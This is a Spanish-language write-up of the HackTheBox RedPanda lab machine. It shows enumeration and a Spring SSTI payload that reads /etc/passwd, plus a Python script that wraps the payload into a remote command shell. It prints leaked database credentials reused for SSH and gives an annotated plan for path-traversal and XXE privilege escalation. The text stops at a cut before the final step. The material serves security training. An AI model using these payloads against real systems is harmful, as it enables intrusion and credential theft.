---
title: WriteUp RedPanda HTB
author: rabb1t
date: 2022-11-26
categories: [HackTheBox, Writeup, Machines, Linux]
tags: [SSTI, XXE, Path-Traversal, Spring-Boot, Code-analyse, Java]
math: false
mermaid: false
image:
  path: https://www.hackthebox.com/storage/avatars/0ba23d9bbfea967268e284e85e0837ff.png
  width: 180
  height: 180
---

## Índice
- [Información básica de la máquina](#máquina-redpanda)
- [Herramientas y recursos empleados](#herramientas-y-recursos-empleados)
- [Enumeración](#enumeración)
- [Buscando pandas rojos](#buscando-pandas-rojos)
- [Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos](#explotando-la-vulnerabilidad-ssti-mientras-buscamos-pandas-rojos)
  - [Obteniendo una shell como el usuario woodenk](#obteniendo-una-shell-como-el-usuario-woodenk)
- [Escalando privilegios](#escalando-privilegios)
  - [Analizando procesos con pspy](#analizando-procesos-con-pspy)
  - [Analizando código en Java y explotando un XXE](#analizando-código-en-java-y-explotando-un-xxe)


## Máquina RedPanda

| IP         |10.10.11.156|
|--------------|------------|
| OS       | Linux      |
| Dificultad   | Fácil      |
| Creador    | Woodenk  |

## Herramientas y recursos empleados

- Herramientas
  - nmap
  - whatweb
  - pspy
  - wfuzz
- Recursos
  - [AllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
  - SecLists

----

## Enumeración
Comenzamos realizando un escaneo con `nmap` a la máquina víctima:

```shell
Nmap 7.92 scan initiated Sun Jul 10 15:52:39 2022 as: nmap -p- -sCV -sS --min-rate 5000 --open -Pn -vvv -n -oN scope.txt 10.10.11.170
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.10.11.170
Host is up, received user-set (1.9s latency).
Not shown: 48716 filtered tcp ports (no-response), 16817 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
8080/tcp open  http-proxy syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sun, 10 Jul 2022 15:53:48 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sun, 10 Jul 2022 15:53:49 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 10 Jul 2022 15:53:49 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Red Panda Search | Made with Spring Boot
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 10 15:54:31 2022 -- 1 IP address (1 host up) scanned in 112.04 seconds
```

Solamente hay dos puertos abiertos, el 22 (SSH) y el 8080 (HTTP). De momento no contamos con usuarios ni credenciales para conectarnos a través de SSH. Vamos a enumerar el puerto 8080. Iniciemos usando la herramienta `whatweb` y ver qué nos reporta:

```shell
rabb1t@hold:~$ whatweb http://10.10.11.170:8080 
http://10.10.11.170:8080 [200 OK] Content-Language[en-US], Country[RESERVED][ZZ], HTML5, IP[10.10.11.170], Title[Red Panda Search | Made with Spring Boot]
```

### Buscando pandas rojos
No nos dice gran cosa, además de ver que se está empleando `Spring Boot` un framework de _Java_. También podemos ver lo mismo en el reporte que nos hizo `nmap`. Procedamos a visualizar la web en nuestro navegador:
![Web RedPanda](/assets/favicon/2022-11-26/redPanda1.png)

Como vimos en el reporte que nos hizo `whatweb`, sabemos que es un buscador de pandas rojos. Bueno, vamos a buscar pandas rojos, obviamente:
![Web RedPanda](/assets/favicon/2022-11-26/redPanda2.png)

—Ese panda se ve un poco surreal—. Ahora ¿Qué tal si probamos alguna inyección tipica como SQL, XSS, LFI, etc? No sucede nada, pero sabemos que se está empleando _Java_, y puede darnos un indicio para intentar probar un _payload_ para inyectar código malicioso. Veamos lo que sucede:
![Web RedPanda](/assets/favicon/2022-11-26/redPanda3.png)

Nos está baneando algún caracter especial (`[$*{}]`), así que podemos hacer un script que nos muestre qué caracteres se están bloqueando, lo podemos hacer con python o con otro lenguaje. En mi caso usaré `wfuzz` de la siguiente manera:

```shell
rabb1t@hold:~$ wfuzz -c --ss 'banned characters' -w /usr/share/SecLists/Fuzzing/special-chars.txt -d 'name=FUZZ' http://10.10.11.170:8080/search
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.170:8080/search
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                 
=====================================================================

000000001:   200        28 L     69 W       755 Ch      "~"                                                     
000000005:   200        28 L     69 W       755 Ch      "$"                                                     
000000013:   200        28 L     69 W       755 Ch      "_"                                                     

Total time: 2.242391
Processed Requests: 32
Filtered Requests: 29
Requests/sec.: 14.27047
```

Se destaca el comando `--ss`, el cual nos muestra solo las solicitudes en las que aparezca el parámetro dado (`banned characters`) en la respuesta. Vemos que hay 3 caracteres especiales que están siendo bloqueados. No podremos usarlos; sin embargo, el diccionario tiene 32 caracteres, nos quedarían 29 caracteres para probar una inyección. Llegados a este punto, he creado un diccionario quitando los 3 caracteres que nos están bloqueando:

```shell
rabb1t@hold:~$ grep -vE '~|\$|_' /usr/share/SecLists/Fuzzing/special-chars.txt > $(pwd)/dict.txt 
```

Ahora podemos hacer un script para verificar con qué caracteres obtendremos un resultado diferente, en mi caso hice una linea en bash:

```shell
rabb1t@hold:~$ for i in $(cat dict.txt); do echo -e "Caracter: ${i}"; curl -s -d "name=${i}{7*7}" http://10.10.11.170:8080/search | grep 'You searched for: 49'; done
```

## Explotando la vulnerabilidad SSTI mientras buscamos pandas rojos
Es probable que no sea tan práctico, pero al ejecutarlo nos muestra dos caracteres (`@*`), los cuales devuelven en la respuesta el número `49`. Teniendo dos caracteres para probar código, es cuando podemos buscar un payload bien diseñado para ejecutar comandos. En este caso he usado este payload del recurso [AllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java):

>
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}


Para usar el anterior payload, debemos cambiar el caracter `$` por alguno de los otros caracteres obtenidos anteriormente. Cuando probamos a usar el caracter `@`, no observamos nada, pero al usar el caracter `*`, obtenemos:
![Web redPanda SSTI](/assets/favicon/2022-11-26/redPanda4.png)

### Obteniendo una shell como el usuario woodenk

Ahora podemos pensar que hacer el proceso del payload anterior para ejecutar comandos puede ser una tarea repetitiva y extenuante. Será mejor hacer un script que nos ayude a convertir cada caracter de una cadena en un número basándonos en el payload anterior. En mi caso hice un script en python:

```python
from bs4 import BeautifulSoup
import sys
import signal
import requests
#variables globales
IP = "10.10.11.170"
PORT = "8080"
URL = f"http://{IP}:{PORT}/search"

data = {"name":""}

def def_handler(sig,frame):
    print("Exit...")
    sys.exit(0)
signal.signal(signal.SIGINT, def_handler)

def makePayload(command):
    payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character)"
    
    characters = [ord(char) for char in command] 
    for i in range(len(characters)):
        if i == 0:
            payload += f".toString({characters[0]})"   
        else:
            payload += f".concat(T(java.lang.Character).toString({characters[i]}))"
    payload += ").getInputStream())}"
    data["name"] = payload

def makeRequest(url,data): 
    r = requests.post(url, data=data)
    soup = BeautifulSoup(r.text,"html.parser")
    try:
        content = soup.find_all("h2")[0].text
        return content.replace("You searched for: ","").strip()
    except Exception:
        return "N/A"

def main():
    while True:
        makePayload(input("> "))
        print(makeRequest(URL, data))

if __name__ == "__main__":
   main()
```

Estamos ejecutando comandos como el usuario `woodenk`. El anterior script simula una terminal, pero tiene muchas limitaciones, no podemos entablarnos una revershell funcional por el momento. Haciendo enumeración básica y viendo los procesos, nos encontramos con lo siguiente:

```shell
> ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         463  0.0  0.7  68512 15140 ?        S<s  05:24   0:04 /lib/systemd/systemd-journald
root         481  0.0  0.0      0     0 ?        I<   05:24   0:00 [ipmi-msghandler]
root         491  0.0  0.3  22632  6200 ?        Ss   05:24   0:01 /lib/systemd/systemd-udevd
root         612  0.0  0.0      0     0 ?        I<   05:24   0:00 [kaluad]
root         613  0.0  0.0      0     0 ?        I<   05:24   0:00 [kmpath_rdacd]
root         614  0.0  0.0      0     0 ?        I<   05:24   0:00 [kmpathd]
root         615  0.0  0.0      0     0 ?        I<   05:24   0:00 [kmpath_handlerd]
root         616  0.0  0.8 214596 17944 ?        SLsl 05:24   0:07 /sbin/multipathd -d -s
systemd+     642  0.0  0.3  90872  6124 ?        Ssl  05:24   0:06 /lib/systemd/systemd-timesyncd
root         654  0.0  0.5  47540 10728 ?        Ss   05:24   0:00 /usr/bin/VGAuthService
root         659  0.1  0.4 311504  8168 ?        Ssl  05:24   1:07 /usr/bin/vmtoolsd
root         671  0.0  0.2  99896  5860 ?        Ssl  05:24   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -
root         689  0.0  0.4 239292  9204 ?        Ssl  05:24   0:01 /usr/lib/accountsservice/accounts-daemon
message+     690  0.0  0.2   7600  4640 ?        Ss   05:24   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --s
root         699  0.0  0.1  81956  3720 ?        Ssl  05:24   0:03 /usr/sbin/irqbalance --foreground
root         702  0.0  0.4 236436  8952 ?        Ssl  05:24   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       705  0.0  0.2 224344  5060 ?        Ssl  05:24   0:00 /usr/sbin/rsyslogd -n -iNONE
root         708  0.0  0.3  17344  7852 ?        Ss   05:24   0:00 /lib/systemd/systemd-logind
root         709  0.0  0.6 395388 13728 ?        Ssl  05:24   0:00 /usr/lib/udisks2/udisksd
root         730  0.0  0.6 318820 13472 ?        Ssl  05:25   0:00 /usr/sbin/ModemManager
root         875  0.0  0.1   6812  2964 ?        Ss   05:25   0:00 /usr/sbin/cron -f
root         876  0.0  0.1   8356  3256 ?        S    05:25   0:00 /usr/sbin/CRON -f
daemon       879  0.0  0.1   3792  2156 ?        Ss   05:25   0:00 /usr/sbin/atd -f
root         880  0.0  0.0   2608   600 ?        Ss   05:25   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         881  0.0  0.2   9416  4448 ?        S    05:25   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk      890  0.8 20.8 3122648 423564 ?      Sl   05:25   9:07 java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         895  0.0  0.3  12172  7384 ?        Ss   05:25   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         901  0.0  0.0   5828  1700 tty1     Ss+  05:25   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
mysql        916  0.2 21.6 1806728 440248 ?      Ssl  05:25   2:27 /usr/sbin/mysqld
systemd+    1110  0.0  0.6  24696 13156 ?        Ss   05:31   0:11 /lib/systemd/systemd-resolved
woodenk    14518  0.0  0.0  81504  1088 ?        Ss   13:45   0:00 gpg-agent --homedir /home/woodenk/.gnupg --use-standard-socket --daemon
root       27752  0.0  0.0      0     0 ?        I    18:52   0:02 [kworker/1:2-events]
root       30652  0.0  0.0      0     0 ?        I    22:20   0:03 [kworker/0:0-events]
root       31175  0.0  0.0      0     0 ?        I    22:55   0:00 [kworker/0:1-events]
root       31177  0.0  0.0      0     0 ?        I    22:55   0:00 [kworker/1:1]
root       31276  0.0  0.0      0     0 ?        I    23:02   0:00 [kworker/u4:1-events_power_efficient]
root       31587  0.0  0.0      0     0 ?        I    23:25   0:00 [kworker/u4:0-events_unbound]
root       31751  0.0  0.4  13956  8924 ?        Ss   23:37   0:00 sshd: woodenk [priv]
woodenk    31784  0.0  0.4  19004  9500 ?        Ss   23:38   0:00 /lib/systemd/systemd --user
root       31785  0.0  0.0      0     0 ?        I    23:38   0:00 [kworker/0:2-mpt_poll_0]
woodenk    31786  0.0  0.1 105584  3208 ?        S    23:38   0:00 (sd-pam)
root       31787  0.0  0.0      0     0 ?        I    23:38   0:00 [kworker/0:3-memcg_kmem_cache]
woodenk    31891  0.0  0.2  13956  6020 ?        S    23:38   0:00 sshd: woodenk@pts/0
woodenk    31892  0.0  0.2   8308  4952 pts/0    Ss   23:38   0:00 -bash
woodenk    31936  0.0  0.1   9080  3568 pts/0    R+   23:40   0:00 ps -aux
```

Vemos un proceso interesante, el cual tiene el `PID 880`, vemos que el usuario `root` está ejecutando como el usuario `woodenk` lo siguiente:

```shell
java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar`
```

Ahora, recordemos nuevamente que se está empleando _Spring Boot_, así que debe tener una estructura como cualquier proyecto. He encontrado este [artículo](https://studygyaan.com/spring-boot/spring-boot-project-folder-structure-and-best-practices) donde nos muestran una estructura que se puede emplear en algunos proyectos. Podemos ver archivos _controladores_ o _controller_. A veces podemos encontrar credenciales en esos lugares. Vamos a revisar la ruta `/opt/panda_search`:

```shell
> ls -la /opt/panda_search/src/main/java/com/panda_search/htb/panda_search
total 24
drwxrwxr-x 2 root root 4096 Jun 21 12:24 .
drwxrwxr-x 3 root root 4096 Jun 14 14:35 ..
-rw-rw-r-- 1 root root 4321 Jun 20 13:02 MainController.java
-rw-rw-r-- 1 root root  779 Feb 21 18:04 PandaSearchApplication.java
-rw-rw-r-- 1 root root 1800 Jun 14 14:09 RequestInterceptor.java
```

Tuve que profundizar en las rutas pero aquí terminan los directorios para este lugar, revisemos entonces el controlador:

```java
import java.util.ArrayList;
import java.io.IOException;
import java.sql.*;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.io.InputStream;
import java.io.FileInputStream;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.http.MediaType;

import org.apache.commons.io.IOUtils;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

@Controller
public class MainController {
  @GetMapping("/stats")
    public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException {
    SAXBuilder saxBuilder = new SAXBuilder();
    if(author == null)
    author = "N/A";
    author = author.strip();
    System.out.println('"' + author + '"');
    if(author.equals("woodenk") || author.equals("damian")) {
      String path = "/credits/" + author + "_creds.xml";
      File fd = new File(path);
      Document doc = saxBuilder.build(fd);
      Element rootElement = doc.getRootElement();
      String totalviews = rootElement.getChildText("totalviews");
            List<Element> images = rootElement.getChildren("image");
      for(Element image: images)
        System.out.println(image.getChildText("uri"));
      model.addAttribute("noAuthor", false);
      model.addAttribute("author", author);
      model.addAttribute("totalviews", totalviews);
      model.addAttribute("images", images);
      return new ModelAndView("stats.html");
    } else {
      model.addAttribute("noAuthor", true);
      return new ModelAndView("stats.html");
    }
  }
  @GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
  public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

    System.out.println("Exporting xml of: " + author);
    if(author.equals("woodenk") || author.equals("damian")) {
      InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
      System.out.println(in);
      return IOUtils.toByteArray(in);
    } else {
      return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
    }
  }
  @PostMapping("/search")
  public ModelAndView search(@RequestParam("name") String name, Model model) {
    if(name.isEmpty()) {
      name = "Greg";
    }
      String query = filter(name);
    ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
    model.addAttribute("pandas", pandas);
    model.addAttribute("n", pandas.size());
    return new ModelAndView("search.html");
  }
  
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }

  public ArrayList searchPanda(String query) {
        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()) {
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
        panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        } catch(Exception e){ System.out.println(e); }
        return pandas;
    }
}
```

Vemos un método `filter` el cual nos impedía escribir esos 4 caracteres que están en el arreglo `no_no_words`, pero lo más importante es que tenemos credenciales con el usuario `woodenk`:
```java 
conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```

—¿Qué tal si se están reutilizando?— Intentemos conectarnos a través de SSH:
```shell
rabb1t@hold:~$ ssh woodenk@10.10.11.170
woodenk@10.10.11.170\'s password: RedPandazRule
```

¡Ganamos acceso con una shell funcional!

## Escalando privilegios
### Analizando procesos con pspy
Haciendo un reconocimiento básico, no encontramos nada de lo que nos podamos aprovechar, así que he optado por usar `pspy` para analizar procesos. Entre los más relevantes encontramos:
```shell
CMD: UID=0    PID=2040   | /bin/sh -c sudo -u woodenk /opt/cleanup.sh
CMD: UID=1000 PID=2051   | /bin/bash /opt/cleanup.sh 
CMD: UID=1000 PID=2052   | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 
CMD: UID=1000 PID=2053   | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; 
CMD: UID=1000 PID=2054   | /usr/bin/find /dev/shm -name *.xml -exec rm -rf {} ; 
CMD: UID=1000 PID=2055   | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ;
CMD: UID=1000 PID=2058   | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ; 
CMD: UID=1000 PID=2049   | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 
CMD: UID=1000 PID=2050   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;
```

`root` está ejecutando un script como el usuario `woodenk` y vemos lo que hace el script —también podríamos verlo directamente con `cat`—. Además, se están eliminando archivos con extensión`.jpg` y `.xml`.

### Analizando código en Java y explotando un XXE
Anteriormente hemos visto que el usuario `root` está ejecutando el compilado del proyecto `java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar`, —también aparece en lo que nos reporta `pspy`—. Revisando un poco la ruta `/opt/` tambíen encontramos un directorio llamado `logParser`, el cual contiene un archivo interesante: parece de la applicación web.

Revisando un poco el código, vemos que se está escribiendo un archivo `xml`, —seguro es para exportarlo—. Además del código anterior, también hemos encontrado un archivo de `logs`:

```shell
woodenk@redpanda:/opt/panda_search$ cat redpanda.log
200||10.10.14.133||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/stats
200||10.10.14.133||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/stats
200||10.10.14.133||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/stats
200||10.10.16.13||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36||/search
200||10.10.14.133||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/stats
200||10.10.16.13||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36||/search
200||10.10.14.133||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/stats
```

Realicemos una petición:
```shell
rabb1t@hold:~$ curl http://10.10.11.170:8080/
```

Si volvemos a revisar el archivo de logs, nos aprece la petición:
```shell
200||10.10.16.18||curl/7.84.0||/
```

En el código _Java_ encontrado, podemos visualizar cómo se está parseando la información. Además vemos que lee los `logs` y realiza ciertas acciones. Si tenemos el control del input en esta parte, podríamos inyectar código. Comentaré el código según los parámetros que enviaré para una mejor comprensión.

> Recordemos que todas las aplicaciones Java comienzan ejecutando la función `main`:
{: .prompt-info}

```java
woodenk@redpanda:/opt/credit-score/LogParser/final/src/main/java/com/logparser$ cat App.java 
package com.logparser;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;

import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;
import org.jdom2.*;

public class App {
  public static Map parseLog(String line) {

    // line = 200||10.10.16.18||||/../../../../../../home/woodenk/linux.jpg||/
    // strings = [200, 10.10.16.18, "", /../../../../../../home/woodenk/linux.jpg, ""]
    String[] strings = line.split("\\|\\|");
    Map map = new HashMap<>();

    // "status_code" : "200"
    map.put("status_code", Integer.parseInt(strings[0]));
      
    // "ip" : "10.10.16.18"
    map.put("ip", strings[1]);

    // "user_agent" : ""
    map.put("user_agent", strings[2]);

    // "uri" : "/../../../../../../home/woodenk/linux.jpg"
    map.put("uri", strings[3]);
      
    return map;
  }
    
  public static boolean isImage(String filename){

    // filename = 200||10.10.16.18||||/../../../../../../home/woodenk/linux.jpg||/
    if(filename.contains(".jpg")){
      return true;
    }
    return false;
  }
    
  public static String getArtist(String uri) throws IOException, JpegProcessingException{
    // uri = /../../../../../../home/woodenk/linux.jpg

    // fullpath = /opt/panda_search/src/main/resources/static/../../../../../../home/woodenk/linux.jpg
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
      
    // Lee el archivo de la variable fullpath, pero hemos hecho un 'path-traversal'
    // así que el path que está leyendo la variable jpgFile sería:
    // fullpath = /home/woodenk/linux.jpg

    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for(Directory dir : metadata.getDirectories()) {
      for(Tag tag : dir.getTags()){

        // Para este punto ya debimos haber subido una imagen con
        // un tag en la metadata llamada 'Artist'
        // para este caso, el valor de este tag debería ser
        // el nombre de nuestro archivo que se leerá para
        // interpretar el código y explotar el XXE
        // el valor que he puesto como metada ha sido: ../home/woodenk/new

        if(tag.getTagName() == "Artist") {
            // ../home/woodenk/new
            return tag.getDescription();
        }
      }
    }
      return "N/A";
  }

  public static void addViewTo(String path, String uri) throws JDOMException, IOException{
    // path = "/credits/../home/woodenks/new_creds.xml"
    // uri = "/../../../../../../home/woodenk/linux.jpg"

    SAXBuilder saxBuilder = new SAXBuilder();
    XMLOutputter xmlOutput = new XMLOutputter();
    xmlOutput.setFormat(Format.getPrettyFormat());

    // Por el path traversal aplicado el archivo que estaremos leyendo es:
    // path = "/home/woodenk/new_creds.xml"
    // Para este punto ya hemos subido nuestro archivo XML malicioso
    
    File fd = new File(path);

    // Lee la estructura del XML
    Document doc = saxBuilder.build(fd);
    
    Element rootElement = doc.getRootElement();

    for(Element el: rootElement.getChildren()) {

    // En nuestro archivo XML debimos haber puesto una estructura con
    // la etiqueta <image> para llegar hasta aquí
      if(el.getName() == "image") {

      // ... y dentro de la etiqueta <image> una etiqueta <uri>
      // comprobación: ""/../../../../../../home/woodenk/linux.jpg"? True
        if(el.getChild("uri").getText().equals(uri)){   
          // Esto de aca dentro es poco relevante
          Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
          System.out.println("Total views:" + Integer.toString(totalviews));
          rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
          Integer views = Integer.parseInt(el.getChild("views").getText());
          el.getChild("views").setText(Integer.toString(views + 1));
        }
      }
    }

    // Llegados a este punto podemos obtener la ejecución de un comando 
    // gracias al XML y lo que hayamos puesto 
    BufferedWriter writer = new BufferedWriter(new FileWriter(fd));

    // File fd = new File(path);  doc = saxBuilder.build(fd);
    // ¡Ya se ha ejecutado el comando puesto en la entidad del XML malicioso
    // y hemos obtenido credenciales como root!
    xmlOutput.output(doc, writer);
  }
    
  public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {

    //Aquí se leen los logs
    File log_fd = new File("/opt/panda_search/redpanda.log");
    Scanner log_reader = new Scanner(log_fd);
    while(log_reader.hasNextLine()){

      // line = 200||10.10.16.18||||/../../../../../../home/woodenk/linux.jpg||/
      String line = log_reader.nextLine();
      if(!isImage(line)){
          continue;
      }

      Map parsed_data = parseLog(line);

      // parsed_data.get("uri") = /../../../../../../home/woodenk/linux.jpg
      System.out.println(parsed_data.get("uri"));

      // artist = ""../home/woodenk/new"
      String artist = getArtist(parsed_data.get("uri").toString());

      // Artist: ../home/woodenk/new
      System.out.println("Artist: " + artist);

      // El path donde residirá el código el cual queremos que sea
      // interpretado
      // xmlPath = "/credits/../home/woodenk/new_creds.xml"
      String xmlPath = "/credits/" + artist + "_creds.xml";
      addViewTo(xmlPath, parsed_data.get("uri").toString());
    }
  }
}
```

Procedamos a decargar cualquier imagen en nuestro equipo y agregar el tag "Artist" a la metadata:
```shell
